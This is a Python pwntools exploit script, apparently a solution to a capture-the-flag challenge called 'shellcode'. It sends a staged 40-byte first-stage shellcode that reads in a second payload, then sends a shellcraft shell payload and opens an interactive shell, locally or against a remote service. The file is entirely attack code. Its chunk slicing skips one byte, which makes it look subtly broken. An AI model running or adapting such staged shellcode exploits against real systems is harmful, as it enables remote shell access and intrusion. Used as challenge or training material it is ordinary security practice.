#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./shellcode"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+341
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

shellcode_addr = 0x777777000

shellcode = asm("""
            // save main func addr to RBX
            add rsp, 0x50
            pop rbx
            // make [rax] writable (for NULL bytes)
            add rsp, 0x8
            pop rax
            // add main function address
            xor rsi, rsi
            add rbx, 0x128
            nop
            movabs rsi,0x777777000
            mov rdx, 71
            // call read(0, shellcode_addr, <big size>)
            push rbx
            ret
            """)

shellcode += b'\x90' * (40 - len(shellcode))


p.sendafter(':', shellcode[0:10])
p.sendafter(':', shellcode[11:21])
p.sendafter(':', shellcode[21:31])
p.sendafter(':', shellcode[31:41])

shellcode = asm(shellcraft.sh())
sleep(1)
p.send(shellcode)


p.interactive()
